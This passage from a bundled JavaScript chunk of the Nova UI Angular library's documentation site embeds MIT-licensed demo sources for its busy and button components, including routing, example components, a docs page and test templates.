rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { Route, RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiBusyModule,\n    NuiButtonModule,\n    NuiCheckboxModule,\n    NuiDocsModule,\n    NuiMessageModule,\n    NuiProgressModule,\n    NuiSelectModule,\n    NuiSpinnerModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport { BusyDocsExampleComponent } from "./busy-docs/busy-docs.example.component";\nimport {\n    BusyBasicExampleComponent,\n    BusyProgressExampleComponent,\n    BusySpinnerExampleComponent,\n    BusyTestComponent,\n    BusyVisualTestComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes: Route[] = [\n    {\n        path: "",\n        pathMatch: "full",\n        component: BusyDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "busy-visual-test",\n        component: BusyVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "busy-test",\n        component: BusyTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiBusyModule,\n        NuiButtonModule,\n        NuiMessageModule,\n        NuiSpinnerModule,\n        NuiCheckboxModule,\n        NuiSelectModule,\n        NuiProgressModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        BusyBasicExampleComponent,\n        BusyDocsExampleComponent,\n        BusySpinnerExampleComponent,\n        BusyProgressExampleComponent,\n        BusyTestComponent,\n        BusyVisualTestComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("busy"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class BusyModule {}\n'},12158:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./busy-basic/busy-basic.example.component";\nexport * from "./busy-docs/busy-docs.example.component";\nexport * from "./busy-progress/busy-progress.example.component";\nexport * from "./busy-spinner/busy-spinner.example.component";\nexport * from "./busy-visual-test/busy-visual-test.component";\nexport * from "./busy-test/busy-test.component";\n'},33225:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button nui-button type="button" (click)="onClick()" i18n>Click me!</button>\n'},47845:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\n\nimport { ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-button-basic-example",\n    templateUrl: "./button-basic.example.component.html",\n})\nexport class ButtonBasicExampleComponent {\n    constructor(@Inject(ToastService) private toastService: ToastService) {}\n\n    onClick(): void {\n        this.toastService.info({\n            message: $localize`Button clicked!`,\n            title: $localize`Event`,\n        });\n    }\n}\n'},77953:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button nui-button type="button" [isBusy]="true" i18n>Click me!</button>\n'},81485:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-button-busy-example",\n    templateUrl: "./button-busy.example.component.html",\n})\nexport class ButtonBusyExampleComponent {}\n'},41881:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button nui-button type="button" displayStyle="action" i18n>Click me!</button>\n'},92629:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-button-display-style-action-example",\n    templateUrl: "./button-display-style-action.example.component.html",\n})\nexport class ButtonDisplayStyleActionExampleComponent {}\n'},41951:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button nui-button type="button" displayStyle="destructive" i18n>\n    Click me!\n</button>\n'},76807:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-button-display-style-destructive-example",\n    templateUrl: "./button-display-style-destructive.example.component.html",\n})\nexport class ButtonDisplayStyleDestructiveExampleComponent {}\n'},65487:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button nui-button type="button" displayStyle="primary" i18n>Click me!</button>\n'},86711:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-button-display-style-primary-example",\n    templateUrl: "./button-display-style-primary.example.component.html",\n})\nexport class ButtonDisplayStylePrimaryExampleComponent {}\n'},8177:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    <code>nui-button</code> allows for easy customization of a button such as\n    changing the size and display style, configuring an icon, making a button\n    auto-repeatable, etc. Typically, the <code>nui-button</code> attribute is\n    applied to the native <code>button</code> tag, but it can be applied other\n    HTML elements as well.\n</p>\n\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiButtonModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    This first example demonstrates the default values for the inputs. For\n    example, <code>displayStyle</code> is not being set explicitly here, so the\n    resulting button is shown with the default styling. See the\n    <strong>Display Style</strong> section for additional display styles.\n</p>\n\n<nui-example-wrapper filenamePrefix="button-basic" exampleTitle="Basic Usage">\n    <nui-button-basic-example></nui-button-basic-example>\n</nui-example-wrapper>\n\n<nui-message type="warning">\n    <strong>Reminder:</strong> The default type of any HTML button is "submit".\n    If submit behavior is not desired for your use case, be sure to set\n    <code>type="button"</code> explicitly.\n</nui-message>\n\n<h2>Display Style</h2>\n<p>\n    To override the default display style, set the\n    <code>displayStyle</code> input to one of the following string values:\n    <code>\'primary\'</code>, <code>\'action\'</code>, or\n    <code>\'destructive\'</code>.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="button-display-style-primary"\n    exampleTitle="Primary"\n>\n    <nui-button-display-style-primary-example></nui-button-display-style-primary-example>\n</nui-example-wrapper>\n\n<nui-example-wrapper\n    filenamePrefix="button-display-style-action"\n    exampleTitle="Action"\n>\n    <nui-button-display-style-action-example></nui-button-display-style-action-example>\n</nui-example-wrapper>\n\n<nui-example-wrapper\n    filenamePrefix="button-display-style-destructive"\n    exampleTitle="Destructive"\n>\n    <nui-button-display-style-destructive-example></nui-button-display-style-destructive-example>\n</nui-example-wrapper>\n\n<h2>Size</h2>\n<p>\n    To override the default size, set the <code>size</code> input to one of the\n    following string values: <code>\'compact\'</code>, or <code>\'large\'</code>.\n</p>\n\n<nui-example-wrapper filenamePrefix="button-size" exampleTitle="Size">\n    <nui-button-size-example></nui-button-size-example>\n</nui-example-wrapper>\n\n<h2>Removing Width Restriction</h2>\n<p>\n    By default all Nova buttons have a <code>max-width: 250px</code> set for\n    their inner content; in case that width is exceeded, their content will be\n    truncated to fit within that maximum width.\n</p>\n<p>\n    In order to remove that restriction, you can apply the\n    <code>unlimited-width</code> CSS class to the <code>button</code> element as\n    shown in the example below.\n</p>\n<nui-example-wrapper\n    filenamePrefix="button-long-text"\n    exampleTitle="Removing the Width Limitation"\n>\n    <nui-with-button-long-text-example></nui-with-button-long-text-example>\n</nui-example-wrapper>\n\n<h2>Adding an Icon</h2>\n<p>\n    To add an icon, pass an icon name to the <code>icon</code> input. For a list\n    of supported icons and icon names see the documentation for\n    <a target="_blank" href="../components/IconComponent.html">IconComponent</a\n    >.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="button-with-icon"\n    exampleTitle="Default Placement"\n>\n    <nui-button-with-icon-example></nui-button-with-icon-example>\n</nui-example-wrapper>\n\n<p>\n    The default left placement of the icon can be overridden. To place the icon\n    to the right of the text within the button set the\n    <code>iconRight</code> input to true.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="button-with-icon-right"\n    exampleTitle="Right Placement"\n>\n    <nui-button-with-icon-right-example></nui-button-with-icon-right-example>\n</nui-example-wrapper>\n\n<p>\n    You can optionally set the icon\'s color through the\n    <code>iconColor</code> input. When no value is provided for\n    <code>iconColor</code>, the default color is determined by the button\'s\n    <code>displayStyle</code> setting.\n</p>\n\n<p>\n    <strong>Note:</strong> For <code>displayStyle</code> "primary", the icon\n    color is not configurable and is set to "white".\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="button-with-icon-custom-color"\n    exampleTitle="Custom Color"\n>\n    <nui-button-with-icon-custom-color-example></nui-button-with-icon-custom-color-example>\n</nui-example-wrapper>\n\n<p>\n    To create an <code>nui-button</code> containing only an icon, set the\n    <code>input</code> and leave the inner content empty.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="button-with-icon-only"\n    exampleTitle="Icon Only"\n>\n    <nui-button-with-icon-only-example></nui-button-with-icon-only-example>\n</nui-example-wrapper>\n\n<h2>Repeat</h2>\n<p>\n    To set <code>nui-button</code> to repeatedly emit click events while the\n    button is pressed continuously, set the <code>isRepeat</code> input to true.\n</p>\n\n<nui-example-wrapper filenamePrefix="button-repeatable" exampleTitle="Repeat">\n    <nui-button-repeatable-example></nui-button-repeatable-example>\n</nui-example-wrapper>\n\n<h2>Busy</h2>\n<p>\n    Set <code>nui-button</code> to busy by passing true to the\n    <code>isBusy</code> input.\n</p>\n\n<nui-example-wrapper filenamePrefix="button-busy" exampleTitle="Busy">\n    <nui-button-busy-example></nui-button-busy-example>\n</nui-example-wrapper>\n\n<h2>Grouping</h2>\n<p>\n    An adjacent set of <code>nui-button</code> instances can be given a style\n    indicating they are part of a group. This can be done by placing them inside\n    a <code>&lt;span&gt;</code> or <code>&lt;div&gt;</code> with the class\n    <code>btn-group</code>. Some of the style accommodations for grouped buttons\n    include rounded corners applied only to the left side of the left-most\n    button and the right side of the right-most button and displaying only a\n    single border between the buttons.\n</p>\n\n<nui-example-wrapper filenamePrefix="button-group" exampleTitle="Grouping">\n    <nui-button-group-example></nui-button-group-example>\n</nui-example-wrapper>\n'},95997:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-button-docs-example",\n    templateUrl: "./button-docs.example.component.html",\n})\nexport class ButtonDocsComponent {}\n'},78131:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="btn-group">\n    <button nui-button type="button" i18n>First</button>\n    <button nui-button type="button" i18n>Second</button>\n    <button nui-button type="button" i18n>Third</button>\n    <button nui-button type="button" i18n>Fourth</button>\n    <button nui-button type="button" i18n>Fifth</button>\n</div>\n'},25195:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-button-group-example",\n    templateUrl: "./button-group.example.component.html",\n})\nexport class ButtonGroupExampleComponent {}\n'},97781:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button\n    [class.unlimited-width]="disableWidthRestriction"\n    nui-button\n    type="button"\n    (click)="toggleWidthRestriction()"\n    i18n\n>\n    Toggle button\'s max-width restriction with a press of a button\n</button>\n'},4593:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-with-button-long-text-example",\n    templateUrl: "./button-with-long-text-example.component.html",\n})\nexport class ButtonWithLongTextExampleComponent {\n    public disableWidthRestriction = true;\n\n    public toggleWidthRestriction(): void {\n        this.disableWidthRestriction = !this.disableWidthRestriction;\n    }\n}\n'},98957:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button\n    nui-button\n    type="button"\n    [isRepeat]="true"\n    displayStyle="action"\n    icon="caret-up"\n    (click)="onCountUpClick()"\n></button>\n<button\n    nui-button\n    type="button"\n    [isRepeat]="true"\n    displayStyle="action"\n    icon="caret-down"\n    (click)="onCountDownClick()"\n></button>\n<span class="nui-text-default">{{ count }}</span>\n'},81401:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-button-repeatable-example",\n    templateUrl: "./button-repeatable.example.component.html",\n})\nexport class ButtonRepeatableExampleComponent {\n    count = 100;\n\n    onCountUpClick(): void {\n        this.count++;\n    }\n\n    onCountDownClick(): void {\n        this.count--;\n    }\n}\n'},45209:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button nui-button type="button" size="compact" i18n>Compact</button>\n<button nui-button type="button" i18n>Default</button>\n<button nui-button type="button" size="large" i18n>Large</button>\n'},43189:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-button-size-example",\n    templateUrl: "./button-size.example.component.html",\n})\nexport class ButtonSizeExampleComponent {}\n'},88425:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<input id="is-repeat-off" type="radio" [(ngModel)]="isRepeat" value="false" />\n<input id="is-repeat-on" type="radio" [(ngModel)]="isRepeat" value="true" />\n<span id="nui-demo-click-results">{{ count }}</span>\n\n<button\n    id="nui-demo-up-btn"\n    nui-button\n    type="button"\n    [isRepeat]="isRepeat === \'true\'"\n    icon="caret-up"\n    (click)="onCountUpClick()"\n></button>\n<button\n    id="nui-demo-primary-compact-btn"\n    nui-button\n    type="button"\n    size="compact"\n    displayStyle="primary"\n    i18n\n>\n    Compact\n</button>\n<button\n    id="nui-demo-primary-large-plus-icon-btn"\n    nui-button\n    type="button"\n    size="large"\n    displayStyle="primary"\n    icon="add"\n    [iconRight]="true"\n    i18n\n>\n    Large + icon\n</button>\n<button\n    id="nui-demo-primary-large-plus-icon-disabled-btn"\n    nui-button\n    type="button"\n    size="large"\n    displayStyle="primary"\n    icon="add"\n    [iconRight]="true"\n    [disabled]="true"\n    i18n\n>\n    Disabled\n</button>\n<button\n    id="nui-demo-primary-large-plus-icon-busy-btn"\n    nui-button\n    type="button"\n    size="large"\n    displayStyle="primary"\n    icon="add"\n    [iconRight]="true"\n    [isBusy]="true"\n    i18n\n>\n    Busy\n</button>\n<button\n    nui-button\n    id="nui-demo-default-compact-btn"\n    type="button"\n    size="compact"\n    displayStyle="default"\n    icon="add"\n    i18n\n>\n    Compact\n</button>\n<button\n    id="nui-default-large-btn"\n    nui-button\n    class="testClass"\n    type="button"\n    size="large"\n    displayStyle="default"\n    icon="add"\n    i18n\n>\n    Large + icon\n</button>\n<button\n    id="nui-demo-action-compact-btn"\n    nui-button\n    type="button"\n    size="compact"\n    displayStyle="action"\n    i18n\n>\n    Compact\n</button>\n<button id="nui-demo-btn-with-icon" nui-button type="button" icon="add" i18n>\n    Icon\n</button>\n\n<nui-with-button-long-text-example\n    id="nui-demo-long-text-btn"\n></nui-with-button-long-text-example>\n'},20037:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-button-test",\n    templateUrl: "./button-test.component.html",\n})\nexport class ButtonTestComponent {\n    isRepeat = "true";\n    count = 100;\n\n    onCountUpClick(): void {\n        this.count++;\n    }\n}\n'},28951:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row"><h3>Basic button</h3></div>\n    <div class="row">\n        <button 